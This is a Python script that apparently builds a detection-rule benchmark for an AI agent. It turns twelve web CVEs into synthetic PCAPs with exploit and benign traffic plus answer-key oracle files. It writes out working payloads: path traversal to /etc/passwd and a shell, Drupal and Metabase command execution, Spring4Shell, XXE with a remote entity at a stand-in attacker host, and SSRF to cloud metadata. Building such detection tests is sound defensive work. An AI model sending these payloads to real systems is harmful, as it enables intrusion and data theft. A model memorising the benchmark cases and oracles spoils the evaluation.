"""Build the frozen 12-case, 60-PCAP SuricataAgent Benchmark v0 dataset."""

from __future__ import annotations

import argparse
import json
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib.parse import quote


PROJECT_DIR = Path(__file__).resolve().parents[1]
if str(PROJECT_DIR) not in __import__("sys").path:
    __import__("sys").path.insert(0, str(PROJECT_DIR))

from generate_pcap import generate_pcap  # noqa: E402


CASES_ROOT = PROJECT_DIR / "benchmarks" / "cases"
MANIFEST_PATH = PROJECT_DIR / "benchmarks" / "v0-manifest.json"


@dataclass(frozen=True, slots=True)
class Sample:
    name: str
    request: dict[str, Any]
    response: dict[str, Any]
    reason: str


@dataclass(frozen=True, slots=True)
class CaseDefinition:
    case_id: str
    family: str
    description: str
    poc: str
    original: Sample
    positives: tuple[Sample, Sample]
    negatives: tuple[Sample, Sample]


def request(
    method: str,
    target: str,
    *,
    headers: dict[str, str] | None = None,
    body: str = "",
) -> dict[str, Any]:
    return {"method": method, "target": target, "headers": headers or {}, "body": body}


def response(
    body: str,
    *,
    status: int = 200,
    reason: str = "OK",
    content_type: str = "text/plain",
) -> dict[str, Any]:
    return {
        "status": status,
        "reason": reason,
        "headers": {"Content-Type": content_type},
        "body": body,
    }


def _http_message(start_line: str, headers: dict[str, str], body: str) -> str:
    body_bytes = body.encode("utf-8")
    normalized = {
        name: value
        for name, value in headers.items()
        if name.casefold() not in {"content-length", "connection"}
    }
    if body_bytes:
        normalized["Content-Length"] = str(len(body_bytes))
    normalized["Connection"] = "close"
    lines = [start_line, *(f"{name}: {value}" for name, value in normalized.items())]
    return "\r\n".join(lines) + "\r\n\r\n" + body


def render_request(value: dict[str, Any]) -> str:
    headers = {"Host": "benchmark.invalid", **value["headers"]}
    return _http_message(
        f"{value['method']} {value['target']} HTTP/1.1",
        headers,
        value["body"],
    )


def render_response(value: dict[str, Any]) -> str:
    return _http_message(
        f"HTTP/1.1 {value['status']} {value['reason']}",
        value["headers"],
        value["body"],
    )


def sample(
    name: str,
    req: dict[str, Any],
    resp: dict[str, Any],
    reason: str,
) -> Sample:
    return Sample(name, req, resp, reason)


def _long_shiro_payload(seed: str) -> str:
    return (seed * 24)[:192] + "=="


def _ssrf_target(letter: str, destination: str) -> str:
    return "/?unix:" + letter * 240 + "|" + destination


def definitions() -> tuple[CaseDefinition, ...]:
    confluence_payload = "queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027"
    drupal_rce = (
        "form_id=user_register_form&_drupal_ajax=1&"
        "mail[%23post_render][]=exec&mail[%23type]=markup&mail[%23markup]=id"
    )
    metabase_original = json.dumps(
        {
            "token": "11111111-2222-3333-4444-555555555555",
            "details": {
                "engine": "h2",
                "name": "benchmark",
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                    "init": "CREATE TRIGGER shell BEFORE SELECT AS $$ java.lang.Runtime.getRuntime().exec('touch /tmp/v0') $$",
                },
            },
        },
        separators=(",", ":"),
    )
    geoserver_get = (
        "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&"
        "typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),"
        "'touch%20/tmp/v0')"
    )
    spring_params = (
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%25%7Bsuffix%7Di&"
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&"
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&"
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=v0&"
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    )
    drupal_sqli = (
        "pass=benchmark&form_build_id=&form_id=user_login_block&op=Log+in&"
        "name[0 or updatexml(0,concat(0xa,user()),0)%23]=admin&name[0]=a"
    )
    xxe_document = (
        '<?xml version="1.0"?><!DOCTYPE message [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><message>&xxe;</message>'
    )
    xxe_target = "/solr/demo/select?wt=xml&defType=xmlparser&q=" + quote(
        xxe_document, safe=""
    )

    return (
        CaseDefinition(
            "CVE-2021-41773",
            "path_traversal",
            "Apache HTTP Server 2.4.49 permits path traversal through an accessible alias when dot segments use the .%2e representation; CGI deployments can also reach executable paths.",
            "Exploit an accessible /icons/ or /cgi-bin/ path with encoded parent-directory segments.",
            sample(
                "original",
                request("GET", "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
                response("root:x:0:0:root:/root:/bin/sh\n"),
                "documented encoded traversal reads /etc/passwd",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"),
                    response("root:$6$benchmark:19000:0:99999:7:::\n"),
                    "same primitive with a different protected target",
                ),
                sample(
                    "positive-02",
                    request(
                        "POST",
                        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body="echo;id",
                    ),
                    response("uid=33(www-data) gid=33(www-data)\n"),
                    "CGI form uses the equivalent repeated .%2e traversal",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/icons/logo.png"),
                    response("PNG", content_type="image/png"),
                    "benign resource on the same exposed alias",
                ),
                sample(
                    "negative-02",
                    request("GET", "/static/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
                    response("not found", status=404, reason="Not Found"),
                    "exploit-like text on an unrelated non-vulnerable endpoint",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2021-43798",
            "file_read",
            "Grafana 8.x plugin asset handling permits unauthenticated path traversal under /public/plugins/<plugin-id>/ and can expose local files.",
            "Request a valid plugin asset prefix followed by parent-directory segments and a local file target.",
            sample(
                "original",
                request("GET", "/public/plugins/alertlist/../../../../../../../../etc/passwd"),
                response("root:x:0:0:root:/root:/bin/bash\n"),
                "documented plugin traversal reads /etc/passwd",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", "/public/plugins/welcome/../../../../../../../../etc/hosts"),
                    response("127.0.0.1 localhost\n"),
                    "different valid plugin and file target",
                ),
                sample(
                    "positive-02",
                    request("GET", "/public/plugins/alertlist/..%2f..%2f..%2f..%2fetc%2fpasswd"),
                    response("root:x:0:0:root:/root:/bin/bash\n"),
                    "slash-encoded traversal representation",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/public/plugins/alertlist/module.js"),
                    response("export default {};", content_type="application/javascript"),
                    "normal plugin asset",
                ),
                sample(
                    "negative-02",
                    request("GET", "/assets/plugins/alertlist/../../../../etc/passwd"),
                    response("not found", status=404, reason="Not Found"),
                    "same text outside the vulnerable plugin route",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2021-26084",
            "ognl_injection",
            "Atlassian Confluence contains an OGNL injection in page-variable actions where crafted queryString values are evaluated before authentication.",
            "Submit an encoded OGNL arithmetic expression in the queryString form field.",
            sample(
                "original",
                request(
                    "POST",
                    "/pages/doenterpagevariables.action",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=confluence_payload,
                ),
                response("<input value=\"54289\">", content_type="text/html"),
                "pre-auth OGNL evaluation on the documented endpoint",
            ),
            (
                sample(
                    "positive-01",
                    request(
                        "POST",
                        "/pages/createpage-entervariables.action",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=confluence_payload,
                    ),
                    response("<input value=\"54289\">", content_type="text/html"),
                    "alternate vulnerable page-variable action",
                ),
                sample(
                    "positive-02",
                    request(
                        "POST",
                        "/pages/doenterpagevariables.action",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body="queryString=%5cu0027%2b%7b7*7%7d%2b%5cu0027",
                    ),
                    response("<input value=\"49\">", content_type="text/html"),
                    "different equivalent OGNL arithmetic expression",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request(
                        "POST",
                        "/pages/doenterpagevariables.action",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body="queryString=release-notes",
                    ),
                    response("<input value=\"release-notes\">", content_type="text/html"),
                    "normal value on the vulnerable endpoint",
                ),
                sample(
                    "negative-02",
                    request(
                        "POST",
                        "/pages/viewpage.action",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=confluence_payload,
                    ),
                    response("page not found", status=404, reason="Not Found"),
                    "OGNL-like value on an unrelated action",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2018-7600",
            "rce",
            "Drupalgeddon2 abuses Form API render callbacks supplied through registration or password forms to execute attacker-selected commands.",
            "POST a form containing a %23post_render callback and attacker-controlled markup.",
            sample(
                "original",
                request(
                    "POST",
                    "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=drupal_rce,
                ),
                response('[{"command":"insert","data":"uid=33(www-data)"}]', content_type="application/json"),
                "documented registration-form post_render execution",
            ),
            (
                sample(
                    "positive-01",
                    request(
                        "POST",
                        "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=drupal_rce.replace("=id", "=whoami"),
                    ),
                    response('[{"command":"insert","data":"www-data"}]', content_type="application/json"),
                    "same render primitive with a different command",
                ),
                sample(
                    "positive-02",
                    request(
                        "POST",
                        "/user/password?element_parents=name/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body="form_id=user_pass&_drupal_ajax=1&name[%23post_render][]=exec&name[%23type]=markup&name[%23markup]=id",
                    ),
                    response('[{"command":"insert","data":"uid=33(www-data)"}]', content_type="application/json"),
                    "alternate vulnerable Form API endpoint",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request(
                        "POST",
                        "/user/register",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body="form_id=user_register_form&mail=user%40example.com&name=benchmark",
                    ),
                    response("registration form", content_type="text/html"),
                    "normal registration submission",
                ),
                sample(
                    "negative-02",
                    request(
                        "POST",
                        "/api/profile",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=drupal_rce,
                    ),
                    response("invalid field", status=400, reason="Bad Request"),
                    "render callback syntax outside Drupal Form API routes",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2023-38646",
            "preauth_rce",
            "Metabase before the patched releases permits unauthenticated H2 JDBC URL injection through /api/setup/validate when a setup token is supplied.",
            "POST setup validation JSON selecting the H2 engine and a zip or mem JDBC database with an INIT trigger.",
            sample(
                "original",
                request("POST", "/api/setup/validate", headers={"Content-Type": "application/json"}, body=metabase_original),
                response('{"valid":true}', content_type="application/json"),
                "documented H2 setup validation injection",
            ),
            (
                sample(
                    "positive-01",
                    request(
                        "POST",
                        "/api/setup/validate",
                        headers={"Content-Type": "application/json"},
                        body=metabase_original.replace("touch /tmp/v0", "id").replace("zip:/app/metabase.jar!/sample-database.db", "mem:benchmark"),
                    ),
                    response('{"valid":true}', content_type="application/json"),
                    "same H2 primitive with mem database and another command",
                ),
                sample(
                    "positive-02",
                    request(
                        "POST",
                        "/api/setup/validate",
                        headers={"Content-Type": "application/json"},
                        body=json.dumps(json.loads(metabase_original), indent=2, sort_keys=True),
                    ),
                    response('{"valid":true}', content_type="application/json"),
                    "JSON whitespace and field-order variant",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request(
                        "POST",
                        "/api/setup/validate",
                        headers={"Content-Type": "application/json"},
                        body='{"token":"11111111-2222-3333-4444-555555555555","details":{"engine":"postgres","details":{"host":"db","dbname":"analytics"}}}',
                    ),
                    response('{"valid":true}', content_type="application/json"),
                    "normal non-H2 database validation",
                ),
                sample(
                    "negative-02",
                    request("POST", "/api/database/validate", headers={"Content-Type": "application/json"}, body=metabase_original),
                    response('{"error":"not found"}', status=404, reason="Not Found", content_type="application/json"),
                    "exploit JSON on a different API route",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2024-36401",
            "expression_rce",
            "GeoServer WFS property-name evaluation can execute arbitrary XPath-derived function expressions supplied through GetPropertyValue requests.",
            "Send WFS GetPropertyValue with an exec(java.lang.Runtime.getRuntime(), ...) valueReference expression.",
            sample(
                "original",
                request("GET", geoserver_get),
                response("<wfs:ValueCollection/>", content_type="application/xml"),
                "documented GET valueReference expression injection",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", geoserver_get.replace("touch%20/tmp/v0", "id").replace("sf:archsites", "sf:roads")),
                    response("<wfs:ValueCollection/>", content_type="application/xml"),
                    "different feature type and command",
                ),
                sample(
                    "positive-02",
                    request(
                        "POST",
                        "/geoserver/wfs",
                        headers={"Content-Type": "application/xml"},
                        body="<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'><wfs:Query typeNames='sf:archsites'/><wfs:ValueReference>exec(java.lang.Runtime.getRuntime(),'id')</wfs:ValueReference></wfs:GetPropertyValue>",
                    ),
                    response("<wfs:ValueCollection/>", content_type="application/xml"),
                    "equivalent POST XML representation",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=name"),
                    response("<wfs:ValueCollection>site</wfs:ValueCollection>", content_type="application/xml"),
                    "normal property lookup",
                ),
                sample(
                    "negative-02",
                    request("GET", geoserver_get.replace("/geoserver/wfs", "/api/wfs")),
                    response("not found", status=404, reason="Not Found"),
                    "expression on an unrelated route",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2022-22965",
            "spring4shell",
            "Spring4Shell abuses nested class.module.classLoader property binding on vulnerable Spring MVC applications to reconfigure a Tomcat access-log valve.",
            "Submit class.module.classLoader.resources.context.parent.pipeline.first.* parameters that create a JSP access log.",
            sample(
                "original",
                request("GET", "/?" + spring_params),
                response("ok"),
                "documented Tomcat pipeline property binding chain",
            ),
            (
                sample(
                    "positive-01",
                    request(
                        "POST",
                        "/",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=spring_params.replace("prefix=v0", "prefix=shell"),
                    ),
                    response("ok"),
                    "form-body representation with a different file prefix",
                ),
                sample(
                    "positive-02",
                    request("GET", "/?" + spring_params.replace("directory=webapps/ROOT", "directory=webapps%2fROOT").replace("prefix=v0", "prefix=probe")),
                    response("ok"),
                    "equivalent encoded directory and different prefix",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("POST", "/", headers={"Content-Type": "application/x-www-form-urlencoded"}, body="className=Invoice&format=json"),
                    response("ok"),
                    "normal similarly named form fields",
                ),
                sample(
                    "negative-02",
                    request("GET", "/health", headers={"X-Debug-Probe": spring_params}),
                    response('{"status":"UP"}', content_type="application/json"),
                    "exploit text in an unrelated header rather than bound parameters",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2016-4437",
            "deserialization",
            "Apache Shiro 1.2.4 uses a known AES key for rememberMe cookies, allowing attacker-crafted encrypted serialized objects to reach deserialization.",
            "Send a long attacker-generated encrypted object in the rememberMe cookie.",
            sample(
                "original",
                request("GET", "/", headers={"Cookie": "rememberMe=" + _long_shiro_payload("QUJDREVGR0hJSktM")}),
                response("welcome", content_type="text/html"),
                "long encrypted rememberMe object",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", "/account", headers={"Cookie": "rememberMe=" + _long_shiro_payload("R0FER0VUMTIzNDU2")}),
                    response("welcome", content_type="text/html"),
                    "different encrypted gadget payload and route",
                ),
                sample(
                    "positive-02",
                    request("GET", "/", headers={"Cookie": "theme=dark; rememberMe=" + _long_shiro_payload("U0hJUk9QQVlMT0FE") + "; locale=en"}),
                    response("welcome", content_type="text/html"),
                    "cookie-order and surrounding-cookie variant",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/", headers={"Cookie": "rememberMe=deleteMe"}),
                    response("login", content_type="text/html"),
                    "normal Shiro cookie deletion marker",
                ),
                sample(
                    "negative-02",
                    request("GET", "/", headers={"Cookie": "session=" + _long_shiro_payload("QUJDREVGR0hJSktM")}),
                    response("login", content_type="text/html"),
                    "long opaque value under a different cookie name",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2014-3704",
            "sqli",
            "Drupal 7 database abstraction expands crafted form array keys, permitting unauthenticated SQL injection through the login form name parameter.",
            "POST a login form whose name array key contains an SQL expression and encoded comment marker.",
            sample(
                "original",
                request("POST", "/?q=node&destination=node", headers={"Content-Type": "application/x-www-form-urlencoded"}, body=drupal_sqli),
                response("PDOException: benchmark", status=500, reason="Internal Server Error"),
                "documented Drupalgeddon SQL expression in name array key",
            ),
            (
                sample(
                    "positive-01",
                    request("POST", "/?q=node&destination=node", headers={"Content-Type": "application/x-www-form-urlencoded"}, body=drupal_sqli.replace("name[", "name%5B").replace("]=admin", "%5D=admin").replace("]=a", "%5D=a")),
                    response("PDOException: benchmark", status=500, reason="Internal Server Error"),
                    "URL-encoded bracket representation",
                ),
                sample(
                    "positive-02",
                    request("POST", "/?q=node&destination=node", headers={"Content-Type": "application/x-www-form-urlencoded"}, body=drupal_sqli.replace("updatexml(0,concat(0xa,user()),0)", "1 or sleep(2)")),
                    response("login failed", content_type="text/html"),
                    "different SQL expression in the vulnerable array key",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("POST", "/?q=node&destination=node", headers={"Content-Type": "application/x-www-form-urlencoded"}, body="name=admin&pass=benchmark&form_id=user_login_block&op=Log+in"),
                    response("login failed", content_type="text/html"),
                    "normal login form",
                ),
                sample(
                    "negative-02",
                    request("POST", "/api/search", headers={"Content-Type": "application/x-www-form-urlencoded"}, body=drupal_sqli),
                    response("invalid query", status=400, reason="Bad Request"),
                    "same payload outside Drupal's login form",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2017-12629",
            "xxe",
            "Apache Solr XML query parsing can resolve attacker-controlled external entities when defType=xmlparser is used on a collection select endpoint.",
            "Send an XML parser query containing a DOCTYPE and external SYSTEM entity.",
            sample(
                "original",
                request("GET", xxe_target),
                response("<response><str>root:x:0:0</str></response>", content_type="application/xml"),
                "local file external entity",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", xxe_target.replace(quote("file:///etc/passwd", safe=""), quote("file:///etc/hosts", safe=""))),
                    response("<response><str>127.0.0.1 localhost</str></response>", content_type="application/xml"),
                    "different local file target",
                ),
                sample(
                    "positive-02",
                    request("GET", xxe_target.replace(quote("file:///etc/passwd", safe=""), quote("http://attacker.invalid/include.dtd", safe=""))),
                    response("<response><lst/></response>", content_type="application/xml"),
                    "remote external entity target",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/solr/demo/select?wt=json&q=title:benchmark"),
                    response('{"response":{"numFound":0}}', content_type="application/json"),
                    "normal Solr query",
                ),
                sample(
                    "negative-02",
                    request("GET", xxe_target.replace("/solr/demo/select", "/search")),
                    response("not found", status=404, reason="Not Found"),
                    "XXE query on a non-Solr route",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2021-40438",
            "ssrf",
            "Apache HTTP Server mod_proxy can be coerced into SSRF by a crafted request-target beginning with a long unix: value followed by a pipe and an HTTP destination.",
            "Send a long /?unix:<padding>|http://... request target through the proxy.",
            sample(
                "original",
                request("GET", _ssrf_target("A", "http://127.0.0.1:8080/admin")),
                response("internal admin", content_type="text/html"),
                "documented unix-pipe proxy confusion",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", _ssrf_target("B", "http://169.254.169.254/latest/meta-data/")),
                    response("instance-id\nlocal-hostname\n"),
                    "different internal destination",
                ),
                sample(
                    "positive-02",
                    request("GET", _ssrf_target("C", "https://127.0.0.1:8443/metrics")),
                    response("requests_total 42\n"),
                    "HTTPS destination and different padding",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/?page=unix-socket-guide"),
                    response("documentation", content_type="text/html"),
                    "benign query containing a related word",
                ),
                sample(
                    "negative-02",
                    request("GET", "/proxy" + _ssrf_target("A", "http://127.0.0.1:8080/admin")),
                    response("not found", status=404, reason="Not Found"),
                    "exploit-like sequence outside the vulnerable request-target shape",
                ),
            ),
        ),
        CaseDefinition(
            "CVE-2025-29927",
            "auth_bypass",
            "Next.js middleware authorization can be bypassed by a forged x-middleware-subrequest recursion header in affected 14.x and 15.x releases.",
            "Request a protected route with x-middleware-subrequest containing five middleware recursion segments.",
            sample(
                "original",
                request("GET", "/dashboard", headers={"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}),
                response("<h1>Dashboard</h1>", content_type="text/html"),
                "documented middleware recursion bypass",
            ),
            (
                sample(
                    "positive-01",
                    request("GET", "/dashboard", headers={"x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"}),
                    response("<h1>Dashboard</h1>", content_type="text/html"),
                    "source-directory middleware naming variant",
                ),
                sample(
                    "positive-02",
                    request("GET", "/admin/settings", headers={"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}),
                    response("<h1>Settings</h1>", content_type="text/html"),
                    "different protected route",
                ),
            ),
            (
                sample(
                    "negative-01",
                    request("GET", "/dashboard"),
                    response("redirect", status=307, reason="Temporary Redirect"),
                    "unauthenticated request without bypass header",
                ),
                sample(
                    "negative-02",
                    request("GET", "/dashboard", headers={"x-middleware-subrequest": "middleware"}),
                    response("redirect", status=307, reason="Temporary Redirect"),
                    "near-miss recursion depth",
                ),
            ),
        ),
    )


def _write_json(path: Path, value: object) -> None:
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def build(output_root: Path) -> dict[str, Any]:
    if output_root.exists():
        raise ValueError(f"Refusing to overwrite frozen cases: {output_root}")
    output_root.mkdir(parents=True)
    manifest_cases: list[dict[str, Any]] = []
    for case_index, case in enumerate(definitions()):
        case_root = output_root / case.case_id
        pcaps_root = case_root / "pcaps"
        pcaps_root.mkdir(parents=True)
        original_request = render_request(case.original.request)
        original_response = render_response(case.original.response)
        _write_json(
            case_root / "input.json",
            {
                "version": 1,
                "case_id": case.case_id,
                "family": case.family,
                "description": case.description,
                "poc": case.poc,
                "poc_http": original_request,
                "response_http": original_response,
            },
        )
        positives = (case.original, *case.positives)
        negatives = case.negatives
        oracle = {
            "version": 1,
            "case_id": case.case_id,
            "positive": [
                {
                    "name": item.name,
                    "kind": "original" if item.name == "original" else "variant",
                    "pcap": f"pcaps/{item.name}.pcap",
                    "reason": item.reason,
                }
                for item in positives
            ],
            "negative": [
                {
                    "name": item.name,
                    "kind": "negative",
                    "pcap": f"pcaps/{item.name}.pcap",
                    "reason": item.reason,
                }
                for item in negatives
            ],
        }
        _write_json(case_root / "oracle.json", oracle)
        for sample_index, item in enumerate((*positives, *negatives)):
            generate_pcap(
                str(pcaps_root / f"{item.name}.pcap"),
                render_request(item.request),
                render_response(item.response),
            )
        manifest_cases.append(
            {
                "case_id": case.case_id,
                "family": case.family,
                "path": f"cases/{case.case_id}",
                "split": "dev",
                "positive_count": 3,
                "negative_count": 2,
                "has_reference_rule": False,
            }
        )
    manifest = {
        "version": 1,
        "name": "suricataagent-benchmark-v0",
        "split": "dev",
        "case_count": len(manifest_cases),
        "pcap_count": len(manifest_cases) * 5,
        "model_visible_file": "input.json",
        "evaluator_only_files": ["oracle.json", "pcaps/*", "reference.rules"],
        "cases": manifest_cases,
    }
    _write_json(MANIFEST_PATH, manifest)
    return manifest


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output-root", type=Path, default=CASES_ROOT)
    args = parser.parse_args()
    manifest = build(args.output_root.resolve())
    print(json.dumps({"cases": manifest["case_count"], "pcaps": manifest["pcap_count"]}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
